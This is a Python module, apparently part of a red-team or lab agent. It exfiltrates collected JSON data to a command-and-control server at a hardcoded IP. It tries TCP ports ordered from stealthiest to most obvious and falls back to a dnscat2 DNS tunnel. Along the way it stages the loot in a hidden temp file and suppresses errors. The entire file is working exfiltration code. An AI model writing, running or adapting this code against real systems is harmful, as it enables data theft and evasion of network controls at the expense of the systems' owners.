import json
import socket
import os
import subprocess

# --- CONFIGURATION ---
C2_IP = "192.168.56.101"
# Priority order: Stealthiest (443) to most obvious (4444)
TCP_PORTS = [443, 80, 445, 8080, 4444] 
DNS_SECRET = "46c3ebb138a4bfed2d80acf4ae432a9e"
DNS_BIN_PATH = "/tmp/dnscat" # Ensure Ansible puts it here!

def send_sliver_tcp(data):
    """Attempts to send JSON data over a list of TCP ports."""
    payload = json.dumps(data).encode()
    
    for port in TCP_PORTS:
        try:
            # We use a short timeout so the agent doesn't hang forever on a blocked port
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(4) 
                print(f"[*] Trying TCP Port {port}...")
                s.connect((C2_IP, port))
                s.sendall(payload)
                print(f"[+] SUCCESS: Data exfiltrated via TCP {port}")
                return True 
        except Exception:
            # Silently continue to the next port if one fails
            continue
    return False

def send_dnscat2_fallback(data):
    """The 'Emergency Egress' - Tunnels data through DNS Port 53."""
    try:
        # 1. Stage the data locally in a hidden file
        loot_path = "/tmp/.sys_log_data"
        with open(loot_path, "w") as f:
            json.dump(data, f)
        
        print("[!] TCP Blocked. Initiating DNS Tunneling via dnscat2...")
        
        # 2. Build the command to 'cat' the loot file through the DNS tunnel
        # We use --once to close the tunnel after the command finishes
        cmd = f"{DNS_BIN_PATH} --dns server={C2_IP},port=53 --secret={DNS_SECRET} --once --exec 'cat {loot_path}'"
        
        # Run in background so the agent can finish its execution
        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("[+] dnscat2 process started. Check C2 for incoming DNS queries.")
        
    except Exception as e:
        print(f"[!] Critical Failure: Could not start DNS fallback: {e}")

def run(data, config):
    # Step 1: Try all TCP Ports
    if not send_sliver_tcp(data):
        # Step 2: If all TCP fails, go to DNS
        send_dnscat2_fallback(data)

